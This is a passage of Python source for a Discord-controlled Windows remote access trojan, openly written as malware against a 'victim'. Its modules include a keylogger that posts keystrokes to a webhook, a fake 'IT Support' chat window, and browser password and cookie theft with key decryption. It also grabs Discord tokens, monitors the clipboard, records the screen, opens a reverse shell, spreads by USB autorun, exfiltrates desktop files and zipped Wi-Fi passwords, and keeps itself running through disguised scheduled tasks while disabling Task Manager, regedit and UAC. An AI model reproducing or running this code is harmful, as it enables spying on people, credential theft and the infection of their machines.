            keyboard.Key.space: ' ', keyboard.Key.enter: '\n', keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]', keyboard.Key.delete: '[DELETE]',
            keyboard.Key.esc: '[ESC]', keyboard.Key.ctrl: '[CTRL]', keyboard.Key.alt: '[ALT]',
            keyboard.Key.shift: '[SHIFT]', keyboard.Key.cmd: '[WIN]', keyboard.Key.caps_lock: '[CAPS]'
        }
        keystroke = f'[{str(key).replace("Key.", "")}]'
        for k, v in special_keys.items():
            if key == k: keystroke = v; break
    keystroke_buffer.append(keystroke)
    if len(keystroke_buffer) >= buffer_size:
        log_data = "".join(keystroke_buffer)
        try: requests.post(KEYLOGGER_WEBHOOK_URL, data={"content": f"```{log_data}```"}, timeout=5); keystroke_buffer.clear()
        except requests.exceptions.RequestException: pass

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener: listener.join()

import tkinter as tk
from tkinter import scrolledtext
import threading
import win32gui
import subprocess
import asyncio
import sys

# --- Globals for Chat ---
new_message_from_victim_event = threading.Event()
victim_message_buffer = ""
gui_app_ref = None

class VictimChatApp:
    def __init__(self, root, discord_loop):
        self.root = root
        self.loop = discord_loop # Pass the running event loop here
        self.root.title("IT Support")
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True) # Borderless window
        
        window_width, window_height = 450, 350
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        self.root.geometry(f'{window_width}x{window_height}+{x}+{y}')

        # Main text display area
        self.text_area = scrolledtext.ScrolledText(
            self.root, wrap='word', state='disabled', bg='#f0f8ff', font=('Arial', 10), padx=5, pady=5
        )
        self.text_area.pack(padx=5, pady=5, expand=True, fill='both')
        self.text_area.tag_config('operator', foreground='blue', justify='right')
        self.text_area.tag_config('victim', foreground='darkgreen', justify='left')

        # --- VICTIM'S ENTRY BOX ---
        entry_frame = tk.Frame(self.root)
        entry_frame.pack(fill='x', padx=5, pady=(0,5))
        self.entry_field = tk.Entry(entry_frame, font=('Arial', 10))
        self.entry_field.pack(side='left', fill='x', expand=True)
        self.entry_field.bind('<Return>', self.send_message)

        # Start the synchronous listener loop in the GUI thread
        self.check_for_messages()

    def add_message(self, sender, message):
        # This is now called from the GUI thread, so it is safe
        self.text_area.config(state='normal')
        padded_message = f" {message} "
        self.text_area.insert('end', f"{padded_message}\n", sender)
        self.text_area.config(state='disabled')
        self.text_area.see('end')

    def send_message(self, event=None):
        """Called when the victim presses Enter."""
        global victim_message_buffer
        message = self.entry_field.get()
        if message:
            self.add_message('victim', f"You: {message}")
            self.entry_field.delete(0, 'end')
            
            # Update buffer and signal the main bot loop (if it were listening to the event)
            # However, we will handle sending directly here using the loop
            victim_message_buffer = message
            new_message_from_victim_event.set()
            
            # Send the message to Discord safely
            if chat_from_victim_channel_id:
                future = asyncio.run_coroutine_threadsafe(
                    self.send_discord_message(chat_from_victim_channel_id, f"**Victim:** {message}"),
                    self.loop
                )
                # Optional: Handle callback/future result here if needed

    async def send_discord_message(self, channel_id, content):
        """Helper async function to send a message."""
        channel = client.get_channel(channel_id)
        if channel:
            await channel.send(content)

    def check_for_messages(self):
        """Synchronous loop that runs in the Tkinter thread using .after()"""
        global chat_to_victim_channel_id
        
        try:
            if chat_to_victim_channel_id:
                # We need to fetch the last message. 
                # Since we are in a sync thread, we schedule the async work on the bot's loop
                future = asyncio.run_coroutine_threadsafe(
                    self.get_last_discord_message(chat_to_victim_channel_id), 
                    self.loop
                )
                
                # We wait briefly for the result (0.1s) to keep GUI responsive
                # If it's not done, we'll catch it next time
                try:
                    result = future.result(timeout=0.1)
                    if result:
                        self.add_message('operator', f"Support: {result}")
                except Exception:
                    pass # Timeout or error, skip this tick
        except Exception as e:
            print(f"[Chat Error] {e}")

        # Schedule this function to run again in 500ms
        self.root.after(500, self.check_for_messages)

    async def get_last_discord_message(self, channel_id):
        """Async helper to get the last message."""
        channel = client.get_channel(channel_id)
        if channel:
            # Get the last message. 
            # NOTE: In a real production app, you should cache the last message ID 
            # to avoid processing the same message repeatedly.
            async for message in channel.history(limit=1):
                if message.author != client.user:
                    # Bring window to front
                    self.bring_to_front()
                    return message.content
        return None

    def bring_to_front(self):
        self.root.lift()
        self.root.attributes('-topmost', True)
        self.root.after_idle(self.root.attributes, '-topmost', False)

def start_victim_chat_gui(loop):
    """Runs the Tkinter GUI in its own thread."""
    global gui_app_ref
    try:
        # Tkinter must run in the main thread of that process usually, 
        # but here we are spawning a new thread for the GUI.
        root = tk.Tk()
        app = VictimChatApp(root, loop)
        gui_app_ref = app
        root.mainloop()
    except Exception as e:
        print(f"[Chat Error] GUI crashed: {e}")

async def handle_chat(ctx, state, author):
    """Starts or stops the interactive chat interface."""
    global chat_active, chat_to_victim_channel_id, chat_from_victim_channel_id
    
    if state == 'start':
        if chat_active:
            await ctx.send("Chat interface is already running.")
            return
        
        chat_active = True
        await ctx.send("üó®Ô∏è **Starting Chat...**")
        try:
            category = client.get_channel(CONFIG.get("PARENT_CATEGORY_ID"))
            overwrites = {
                ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                ctx.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                author: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            }
            chat_to_victim = await category.create_text_channel("chat-to-victim", overwrites=overwrites)
            chat_from_victim = await category.create_text_channel("chat-from-victim", overwrites=overwrites)
            
            chat_to_victim_channel_id = chat_to_victim.id
            chat_from_victim_channel_id = chat_from_victim.id
            
            await ctx.send(f"‚úÖ Channels created. Victim window should now open.\n**To:** {chat_to_victim.mention}\n**From:** {chat_from_victim.mention}")
        except Exception as e:
            await ctx.send(f"‚ùå Failed to create chat channels: {e}")
            chat_active = False
            return

        # Start the GUI in a new thread, passing the running event loop
        gui_thread = threading.Thread(target=start_victim_chat_gui, args=(client.loop,), daemon=True)
        gui_thread.start()
        
        # NOTE: We do NOT start unified_chat_listener here anymore. 
        # The listener is now built into the GUI via check_for_messages.

    elif state == 'stop':
        if not chat_active:
            await ctx.send("Chat interface is not running.")
            return
        chat_active = False
        await ctx.send("üõë **Stopping Chat...**")
        # Note: Stopping the Tkinter thread cleanly usually requires killing the window or using a shared exit flag
        if gui_app_ref:
            try:
                gui_app_ref.root.destroy()
            except:
                pass

# ==============================================================================
# --- END OF INTERACTIVE CHAT MODULE ---
# ==============================================================================

# --- BROWSER STEALER, CLIPBOARD MONITOR, VIDEO RECORDER, UPDATER, UNINSTALLER, RECENT DOCS, NETWORK SCAN, WEBSITE DETECTION, SCHEDULED TASK, EXFIL, PASSWORD STEALER ---
def get_browser_data():
    try:
        paths = {"Chrome": os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Default'), "Edge": os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data\\Default')}
        results = ["--- Browser Data ---"]
        for browser, path in paths.items():
            if not os.path.exists(path): continue
            results.append(f"\n--- {browser} ---")
            history_path = os.path.join(path, 'History')
            if os.path.exists(history_path):
                try:
                    temp_history = os.path.join(tempfile.gettempdir(), "temp_history.db")
                    shutil.copy2(history_path, temp_history)
                    conn = sqlite3.connect(temp_history)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    for url, title, timestamp in cursor.fetchall(): results.append(f"HISTORY: {title} -> {url}")
                    conn.close(); os.remove(temp_history)
                except Exception as e: results.append(f"Could not read history: {e}")
            cookies_path = os.path.join(path, 'Cookies')
            if os.path.exists(cookies_path):
                try:
                    temp_cookies = os.path.join(tempfile.gettempdir(), "temp_cookies.db")
                    shutil.copy2(cookies_path, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, host_key FROM cookies")
                    for name, host in cursor.fetchall(): results.append(f"COOKIE: {name} on {host}")
                    conn.close(); os.remove(temp_cookies)
                except Exception as e: results.append(f"Could not read cookies: {e}")
        return "\n".join(results) if len(results) > 1 else "No browser data found."
    except Exception as e: return f"An error occurred: {e}"

def get_browser_passwords():
    try:
        paths = {"Chrome": os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data'), "Edge": os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft\\Edge\\User Data')}
        results = ["--- Recovered Browser Passwords ---"]
        for browser, path in paths.items():
            login_db_path = os.path.join(path, 'Default', 'Login Data')
            local_state_path = os.path.join(path, 'Local State')
            if not os.path.exists(login_db_path): continue
            results.append(f"\n--- {browser} Passwords ---")
            master_key = None
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except Exception as e:
                results.append(f"Could not get master key: {e}"); continue
            try:
                temp_db = os.path.join(tempfile.gettempdir(), f"temp_login_{browser.lower()}.db")
                shutil.copy2(login_db_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, encrypted_pass in cursor.fetchall():
                    if user and encrypted_pass:
                        decrypted_pass = None
                        try:
                            if encrypted_pass.startswith(b'v10') or encrypted_pass.startswith(b'v11') or encrypted_pass.startswith(b'v20'):
                                nonce = encrypted_pass[3:15]; ciphertext = encrypted_pass[15:-16]; tag = encrypted_pass[-16:]
                                derived_key = HKDF(master_key, 32, b'', SHA256)
                                cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
                                decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
                                results.append(f"URL: {url}\nUser: {user}\nPassword: {decrypted_pass}\n---")
                            else:
                                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                                results.append(f"URL: {url}\nUser: {user}\nPassword: {decrypted_pass} (Old Method)\n---")
                        except Exception:
                            results.append(f"URL: {url}\nUser: {user}\nPassword: [Could Not Decrypt]\n---")
                conn.close(); os.remove(temp_db)
            except Exception as e:
                results.append(f"Could not read passwords for {browser}: {e}")
        return "\n".join(results) if len(results) > 1 else "No browser passwords found."
    except Exception as e: return f"An error occurred: {e}"

class ClipboardMonitor:
    def __init__(self): self.last_clipboard = ""
    def start(self):
        logging.info("Clipboard monitor started.")
        while True:
            try:
                win32clipboard.OpenClipboard()
                current_clipboard = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                if current_clipboard != self.last_clipboard and isinstance(current_clipboard, str):
                    self.last_clipboard = current_clipboard
                    channel = client.get_channel(CHANNEL_IDS.get('system_channel_id'))
                    if channel and len(current_clipboard) < 1900:
                        asyncio.create_task(channel.send(f"**üìã New Clipboard Content:**\n```\n{current_clipboard}\n```"))
            except Exception: pass
            time.sleep(2)

def start_clipboard_monitor():
    monitor = ClipboardMonitor()
    monitor.start()

async def capture_desktop_video(ctx, duration_seconds=15, fps=10):
    await ctx.send(f"üé• **Recording desktop for {duration_seconds} seconds...**")
    frames = []
    frame_delay = 1.0 / fps
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            img_size = (monitor['width'], monitor['height'])
            recording_time = time.time() + duration_seconds
            while time.time() < recording_time:
                sct_img = sct.grab(monitor)
                img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
                frame = np.array(img); frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                frames.append(frame); time.sleep(frame_delay)
        if not frames: await ctx.send("‚ùå No frames were captured. Video recording failed."); return
        temp_dir = tempfile.gettempdir()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_path = os.path.join(temp_dir, f"desktop_capture_{timestamp}.mp4")
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_writer = cv2.VideoWriter(video_path, fourcc, fps, img_size)
        for frame in frames: video_writer.write(frame)
        video_writer.release()
        await ctx.send(f"‚úÖ **Desktop capture complete.**", file=discord.File(video_path))
        os.remove(video_path)
    except Exception as e:
        await ctx.send(f"‚ùå An error occurred during video capture: {e}")

async def update_malware(ctx, url):
    await ctx.send("üîÑ **Downloading update...**")
    try:
        if not url.startswith('http'): raise ValueError("Invalid URL provided.")
        downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
        hidden_folder_name = "unknown"
        hidden_folder_path = os.path.join(downloads_path, hidden_folder_name)
        if not os.path.exists(hidden_folder_path):
            os.makedirs(hidden_folder_path)
            ctypes.windll.kernel32.SetFileAttributesW(hidden_folder_path, 2)
        new_exe_path = os.path.join(hidden_folder_path, "client.exe")
        with requests.get(url, stream=True, timeout=30) as r:
            r.raise_for_status()
            with open(new_exe_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        bat_path = os.path.join(hidden_folder_path, "start_new.bat")
        with open(bat_path, "w") as f:
            f.write(f"@echo off\nping 127.0.0.1 -n 6 > nul\nstart \"\" \"{new_exe_path}\"\ndel \"%~f0\"")
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        await ctx.send(f"‚úÖ **Update successful. The new instance will start in a few seconds.**")
        await client.close()
    except Exception as e:
        await ctx.send(f"‚ùå **Update failed:** {e}")

async def uninstall_malware(ctx):
    await ctx.send("üßπ **Starting uninstall process. This is irreversible.**")
    try:
        logging.shutdown()
        remove_runonce_persistence()
        remove_startup_persistence()
        enable_regedit()
        enable_cmd()
        enable_uac_prompts()
        remove_scheduled_task_persistence()
        files_to_delete = [log_file_path, ID_FILE_PATH, os.path.join(os.environ['APPDATA'], 'system_log.txt'), ]
        for f in files_to_delete:
            if os.path.exists(f): os.remove(f)
        await ctx.send("‚úÖ **Uninstall complete. Shutting down.**")
        await client.close()
        exe_path = sys.executable
        bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
        with open(bat_path, "w") as f:
            f.write(f"@echo off\ntimeout /t 2 /nobreak >nul\ndel /f /q \"{exe_path}\"\ndel /f /q \"%~f0\"")
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        await ctx.send(f"‚ùå **Uninstall failed:** {e}")

def get_recent_documents():
    try:
        recent_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Recent')
        if not os.path.exists(recent_folder): return "Recent Documents folder not found."
        files = os.listdir(recent_folder)
        if not files: return "No recent documents found."
        files.sort(key=lambda x: os.path.getmtime(os.path.join(recent_folder, x)), reverse=True)
        clean_files = [os.path.splitext(f)[0] for f in files[:50]]
        return "--- Recent Documents ---\n" + "\n".join(clean_files)
    except Exception as e:
        return f"An error occurred while fetching recent documents: {e}"

def scan_network():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        subnet = ".".join(local_ip.split('.')[:-1]) + '.'
        logging.info(f"Scanning network on subnet: {subnet}*")
        active_ips = []
        for i in range(1, 255):
            ip = subnet + str(i)
            result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if result.returncode == 0: active_ips.append(ip)
        if not active_ips: return "No other active devices found on the network."
        return f"--- Active Devices on Network ({subnet}*) ---\n" + "\n".join(active_ips)
    except Exception as e:
        return f"An error occurred during network scan: {e}"

# --- WEBSITE DETECTION MONITOR (FIXED) ---
def detect_website_visit():
    """Synchronous thread function that detects website visits and schedules async tasks."""
    logging.info("Website detection monitor started.")
    last_seen_url = ""
    browser_keywords = [" - Google Chrome", " - Mozilla Firefox", " - Microsoft Edge", " - Opera", " - Brave"]
    target_domains = ["amazon", "paypal", "gmail", "outlook", "facebook", "instagram", "twitter", "linkedin", "ebay", "reddit", "github", "stackoverflow", "netflix", "youtube", "twitch", "discord", "steam", "epicgames", "chase", "bank", "hsbc", "barclays", "bankofscotland"]
    
    while True:
        try:
            def window_callback(hwnd, windows):
                if win32gui.IsWindowVisible(hwnd):
                    title = win32gui.GetWindowText(hwnd)
                    if title: 
                        windows.append(title)
                        return True
            windows = []
            win32gui.EnumWindows(window_callback, windows)
            for title in windows:
                is_browser = any(keyword in title for keyword in browser_keywords)
                if is_browser:
                    page_title = title.split(" - ")[0]
                    found_domain = next((domain for domain in target_domains if domain.lower() in page_title.lower()), None)
                    if found_domain and page_title != last_seen_url:
                        last_seen_url = page_title
                        logging.info(f"Website visit detected: {page_title}")
                        
                        # --- FIX: Use asyncio.run_coroutine_threadsafe ---
                        # Get the running event loop from the client
                        loop = client.loop
                        if loop and not loop.is_closed():
                            try:
                                # Schedule the async function to be run in the main loop
                                asyncio.run_coroutine_threadsafe(
                                    send_website_alert(page_title),
                                    loop
                                )
                            except RuntimeError as e:
                                logging.error(f"Failed to schedule website alert task: {e}")
                        else:
                            logging.error("Could not get event loop to schedule website alert.")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Error in website detection: {e}")
            time.sleep(10)

# --- NEW HELPER ASYNC FUNCTION ---
async def send_website_alert(page_title):
    """This is the async function that actually sends the Discord message."""
    channel = client.get_channel(CHANNEL_IDS.get('system_channel_id'))
    if channel:
        message = f"üåê **Website Visit Detected:**\n**User is on:** `{page_title}`"
        await channel.send(message)

def add_scheduled_task_persistence():
    try:
        if getattr(sys, 'frozen', False): exe_path = sys.executable
        else: exe_path = os.path.abspath(__file__)
        task_names = ["WindowsUpdateChecker", "SystemHealthMonitor", "DriverCompatibilityService", "SysinternalsUpdater"]
        task_name = random.choice(task_names)
        command = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /ru "SYSTEM" /rl highest /f'
        process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if process.returncode == 0:
            logging.info(f"Scheduled task '{task_name}' created successfully.")
            return f"Success: Task '{task_name}' created."
        else:
            logging.error(f"Failed to create scheduled task. Error: {process.stderr}")
            return f"Failed: {process.stderr.strip()}"
    except Exception as e:
        logging.error(f"An error occurred creating scheduled task: {e}")
        return f"An error occurred: {e}"

def remove_scheduled_task_persistence():
    task_names = ["WindowsUpdateChecker", "SystemHealthMonitor", "DriverCompatibilityService", "SysinternalsUpdater"]
    removed_tasks = []
    for task_name in task_names:
        command = f'schtasks /delete /tn "{task_name}" /f'
        process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if process.returncode == 0:
            removed_tasks.append(task_name)
            logging.info(f"Scheduled task '{task_name}' removed.")
    return f"Success: Removed tasks {removed_tasks}." if removed_tasks else "Success: No matching tasks found to remove."

async def handle_exfil(ctx):
    await ctx.send("üö® **Starting data exfiltration... This may take a moment.**")
    temp_dir = tempfile.mkdtemp()
    zip_filename = os.path.join(temp_dir, f"victim_profile_{CLIENT_ID}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zf:
            sys_info = f"PC Name: {platform.node()}\nOS: {platform.system()} {platform.release()}\nAdmin: {is_admin()}"
            zf.writestr("system_info.txt", sys_info)
            try:
                scr_path = os.path.join(temp_dir, "screenshot.png")
                with mss.mss() as sct: sct.shot(output=scr_path)
                zf.write(scr_path, "screenshot.png")
                os.remove(scr_path)
            except Exception as e: zf.writestr("screenshot_error.txt", f"Failed to take screenshot: {e}")
            zf.writestr("wifi_passwords.txt", get_wifi_passwords())
            zf.writestr("browser_data.txt", get_browser_data())
            zf.writestr("recent_documents.txt", get_recent_documents())
            zf.writestr("network_scan.txt", scan_network())
            zf.writestr("running_processes.txt", get_running_processes())
        if os.path.getsize(zip_filename) > 8 * 1024 * 1024:
            await ctx.send("‚ùå **Exfiltration failed:** The resulting ZIP file is too large (>8MB) to send via Discord.")
        else:
            await ctx.send(f"‚úÖ **Exfiltration complete.**", file=discord.File(zip_filename))
    except Exception as e:
        await ctx.send(f"‚ùå **Exfiltration failed:** An error occurred: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


# ==============================================================================
# --- NEW MODULES: INFORMATION GATHERING, REMOTE CONTROL, EXPANSION ---
# ==============================================================================

# --- Information Gathering: Discord Token Grabber ---
def get_discord_tokens():
    """Finds and decrypts Discord tokens from browsers."""
    paths_to_check = [
        os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['APPDATA'], 'Lightcord', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        os.path.join(os.environ['LOCALAPPDATA'], 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb')
    ]
    tokens = []
    for path in paths_to_check:
        if not os.path.exists(path): continue
        for file_name in os.listdir(path):
            if not file_name.endswith('.ldb') and not file_name.endswith('.log'): continue
            try:
                file_path = os.path.join(path, file_name)
                with open(file_path, 'r', errors='ignore', encoding='utf-8') as f:
                    content = f.read()
                    for line in content.splitlines():
                        for regex in (r'discord.com/api/v[0-9]/users/@me', r'discordapp.com/api/v[0-9]/users/@me', r'[' '""]([A-Za-z0-9+/]{20,})[' '""]'):
                            for token in re.findall(regex, line):
                                if token not in tokens and token.count('.') >= 2:
                                    tokens.append(token)
            except Exception:
                continue
    return "\n".join(tokens) if tokens else "No Discord tokens found."

# --- Remote Control: Simple Reverse Shell ---
reverse_shell_active = False
reverse_shell_channel_id = None

async def handle_reverse_shell(ctx, state):
    # This function MUST also declare its intent to modify the global variables
    global reverse_shell_active, reverse_shell_channel_id

    if state == 'start':
        reverse_shell_active = True
        # --- FIX ---
        # The correct way to get the channel ID from the context (ctx) is ctx.id
        reverse_shell_channel_id = ctx.id 
        await ctx.send("‚úÖ **Reverse Shell is now ACTIVE.** Type commands directly in this channel (without `!run`). Type `shell_stop` to end.")
    elif state == 'stop':
        reverse_shell_active = False
        reverse_shell_channel_id = None
        await ctx.send("‚ùå **Reverse Shell is now INACTIVE.**")

async def execute_shell_command(command):
    try:
        process = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        stdout, stderr = process.communicate()
        return stdout + stderr if stderr else stdout
    except Exception as e:
        return f"Execution Error: {e}"

# --- Expansion: USB Spreader ---
def spread_usb():
    """
    Checks for removable drives and copies the malware to them.
    Hides the file and creates an autorun.inf.
    """
    if not CONFIG.get("USB_SPREADER", False):
        return

    logging.info("[USB] Checking for USB drives...")

    # Get the blacklist from config (e.g., "C D")
    # We use .get() with a default to prevent crashing if the key doesn't exist in old configs
    blacklist_str = CONFIG.get("USB_BLACKLIST", "C D")
    safe_mode = CONFIG.get("USB_SAFE_MODE", True)
    
    # Parse blacklist into a set of uppercase letters: {'C', 'D'}
    # We strip colons and spaces to be safe
    blacklist = set([x.strip().replace(":", "").upper() for x in blacklist_str.split()])

    # Detect drives
    try:
        drives = win32api.GetLogicalDriveStrings()
        drive_list = drives.split('\\000')[:-1] # Split and remove empty last element
    except Exception as e:
        logging.error(f"[USB] Failed to get drive list: {e}")
        return

    infected_count = 0

    for drive in drive_list:
        # Get just the first letter (e.g., "C" from "C:\\")
        drive_letter = drive[0].upper() 

        # --- SAFETY CHECK ---
        # If Safe Mode is ON, check if this drive is in the blacklist.
        if safe_mode:
            if drive_letter in blacklist:
                logging.info(f"[USB] Skipping {drive} (Blacklisted/Safe Drive)")
                continue

        # Check if it's actually a Removable drive
        try:
            drive_type = win32api.GetDriveType(drive)
        except Exception as e:
            logging.error(f"[USB] Error checking drive type for {drive}: {e}")
            continue
        
        if drive_type == win32con.DRIVE_REMOVABLE:
            logging.info(f"[USB] Found Removable Drive: {drive}")

            try:
                # Define paths
                # We name it something innocent like "Update.exe"
                target_path = os.path.join(drive, "Update.exe")
                autorun_path = os.path.join(drive, "autorun.inf")

                # Check if already infected to avoid overwriting constantly
                if os.path.exists(target_path):
                    # Optional: You could verify file size here to ensure it's the right file
                    continue

                # 1. Copy the executable
                # sys.executable is the path to the currently running .exe
                shutil.copyfile(sys.executable, target_path)
                logging.info(f"[USB] Copied malware to {target_path}")

                # 2. Set file attributes to Hidden + System
                win32api.SetFileAttributes(target_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)

                # 3. Create Autorun.inf
                # Note: Autorun doesn't work on modern Windows (10/11) without registry hacks,
                # but it's good practice to include.
                autorun_content = f"""[autorun]
open={os.path.basename(target_path)}
shell\\open\\command={os.path.basename(target_path)}
action=Open Folder
icon=%SystemRoot%\\system32\\shell32.dll,4"""
                
                with open(autorun_path, 'w') as f:
                    f.write(autorun_content)
                
                # Hide autorun.inf
                win32api.SetFileAttributes(autorun_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)

                logging.info(f"[USB] Successfully infected {drive}")
                infected_count += 1

            except Exception as e:
                logging.error(f"[USB] Failed to infect {drive}: {e}")

    if infected_count > 0:
        logging.info(f"[USB] Finished. Infected {infected_count} drive(s).")

# --- Information Gathering: Real-time File Exfiltration Monitor ---
class ExfilEventHandler(FileSystemEventHandler):
    def __init__(self, channel_id, client_ref):
        self.channel_id = channel_id
        self.client_ref = client_ref

    async def send_file(self, file_path):
        channel = self.client_ref.get_channel(self.channel_id)
        if not channel: return
        try:
            # Cap file size at 8MB
            if os.path.getsize(file_path) < 8 * 1024 * 1024:
                await channel.send(f"üö® **New/Modified File Detected:** `{os.path.basename(file_path)}`", file=discord.File(file_path))
        except Exception as e:
            print(f"[EXFIL MONITOR] Failed to send file {file_path}: {e}")

    def on_created(self, event):
        if not event.is_directory:
            time.sleep(2) # Wait for file to be fully written
            asyncio.create_task(self.send_file(event.src_path))

    def on_modified(self, event):
        if not event.is_directory:
            time.sleep(2) # Wait for file to be fully written
            asyncio.create_task(self.send_file(event.src_path))

def start_exfil_monitor(client_instance, channel_id):
    # This watches the user's Desktop for any new or modified files
    path_to_watch = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(path_to_watch): 
        print(f"[EXFIL MONITOR] Path {path_to_watch} not found, monitor not started.")
        return
    event_handler = ExfilEventHandler(channel_id, client_instance)
    observer = Observer()
    observer.schedule(event_handler, path_to_watch, recursive=True)
    observer.start()
    print(f"[EXFIL MONITOR] Watching {path_to_watch} for changes.")

# ==============================================================================
# --- END OF NEW MODULES ---
# ==============================================================================


# --- BOT SETUP ---
intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.guilds = True
client = discord.Client(intents=intents)
CHANNEL_IDS = {}

# ==============================================================================
# --- ALL COMMAND HANDLERS ---
# ==============================================================================
async def handle_unmute_mic(ctx):
    await ctx.send("üé§ Attempting to unmute the system microphone...")
    try:
        command = 'nircmd.exe setsysvolume 65535 "Microphone"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            await ctx.send("‚úÖ **Microphone has been unmuted.**")
        else:
            await ctx.send(f"‚ùå **Failed to unmute microphone.**\n**Reason:** `nircmd returned error: {result.stderr.strip()}`")
            await ctx.send("üí° The device might not be named 'Microphone'. A more advanced script would be needed to find its exact name.")
    except FileNotFoundError:
        await ctx.send("‚ùå **Failed to unmute microphone.**\n**Reason:** `nircmd.exe was not found.`")
    except Exception as e:
        await ctx.send(f"‚ùå **An unexpected error occurred:** {str(e)}")

async def handle_disabletm(ctx):
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        await ctx.send("Task Manager has been disabled.")
    except Exception:
        await ctx.send("Failed to disable Task Manager. The executable may not be running as Administrator.")

async def handle_enabletm(ctx):
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
        await ctx.send("Task Manager has been enabled.")
    except FileNotFoundError:
        await ctx.send("Task Manager has been enabled.")
    except Exception:
        await ctx.send("Failed to enable Task Manager.")

async def handle_disableregedit(ctx):
    success = disable_regedit()
    await ctx.send("Registry Editor (regedit) has been disabled." if success else "Failed to disable Registry Editor.")

async def handle_enableregedit(ctx):
    success = enable_regedit()
    await ctx.send("Registry Editor (regedit) has been enabled." if success else "Failed to enable Registry Editor.")

async def handle_disablecmd(ctx):
    success = disable_cmd()
    await ctx.send("Command Prompt (cmd) has been disabled." if success else "Failed to disable Command Prompt.")

async def handle_enablecmd(ctx):
    success = enable_cmd()
    await ctx.send("Command Prompt (cmd) has been enabled." if success else "Failed to enable Command Prompt.")

async def handle_disableuac(ctx):
    success = disable_uac_prompts()
    await ctx.send("‚úÖ UAC prompts have been disabled. A **restart is required** for the change to take full effect." if success else "‚ùå Failed to disable UAC prompts. The executable MUST be running as Administrator.")

async def handle_enableuac(ctx):
